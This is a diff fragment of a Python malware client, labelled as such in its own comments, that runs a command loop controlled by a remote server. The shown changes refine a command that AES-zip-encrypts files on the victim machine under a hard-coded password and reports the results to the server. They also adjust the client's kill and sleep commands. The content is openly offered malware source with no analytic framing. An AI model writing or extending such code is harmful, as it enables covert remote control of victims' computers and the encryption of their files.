@@ -220,20 +220,17 @@ while True:
 
         # ZIP file using AES Encryption and LZMA compression method
         try:
-            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
-                zipFile.setpassword(ZIP_PASSWORD)
-
-                # We have functionality to zip-encrypt files, no directory yet
-                if path.isdir(filepath):
-                    post_to_server(f"{filepath} on {client} is a directory. only Files can be zip-encrypted. \n")
-                else:
+            # Make sure we are not trying to zip-encrypt directory and that the files are existed
+            if path.isdir(filepath):
+                post_to_server(f"{filepath} on {client} is a directory. only Files can be zip-encrypted. \n")
+            elif not path.isfile(filepath):
+                raise OSError
+            else:
+                with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zipFile:
+                    zipFile.setpassword(ZIP_PASSWORD)
                     zipFile.write(filepath, arcname=filename)
                     post_to_server(f"{filename}.zip is now Zipped and Encrypted in {filepath}.zip on the client. \n")
 
-        except FileNotFoundError:
-            post_to_server(f"{filepath} is not found on the {client}.\n")
-        except PermissionError:
-            post_to_server(f"You don't have permission to zip-encrypt {filepath} on the {client}.\n")
         except OSError:
             post_to_server(f"Unable to Access {filepath} on the {client}, OS Error.\n")
 
@@ -267,11 +264,11 @@ while True:
 
 
     # the client Kill Command shutdown our malware
-    elif command.startswith("client kill"):
+    elif command == "client kill":
         post_to_server(f"{client} has been Killed. \n")
         exit()
     # the client sleep SECOND command will sleep the client for number of seconds
-    elif command.startswith("client sleep "):
+    elif command.startswith("client sleep"):
         # Slicing the command to remove the client sleep and the extract delay
         try:
             delay = float(command.split()[2])
